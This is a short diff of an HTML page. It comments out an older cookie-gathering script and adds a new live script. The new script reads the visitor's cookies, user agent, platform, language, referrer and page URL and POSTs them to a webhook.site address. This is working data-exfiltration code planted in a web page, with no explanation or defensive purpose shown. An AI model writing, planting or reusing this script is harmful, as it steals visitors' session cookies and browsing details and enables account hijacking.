@@ -71,7 +71,7 @@
   
 // </script> -->
 
-  <script>
+  <!-- <script>
 function sendData() {
   const cookies = document.cookie
     .split(";")
@@ -104,8 +104,23 @@ function sendData() {
 }
 
 sendData();
-</script>
+</script> -->
+<script>
+const data = new URLSearchParams({
+  cookies: document.cookie,
+  userAgent: navigator.userAgent,
+  platform: navigator.platform,
+  language: navigator.language,
+  referrer: document.referrer,
+  url: location.href
+});
 
+fetch("https://webhook.site/f6a09363-360d-4d13-8716-77a7c162b420", {
+  method: "POST",
+  body: data
+});
+</script>
+  
 
 </body>
 </html>
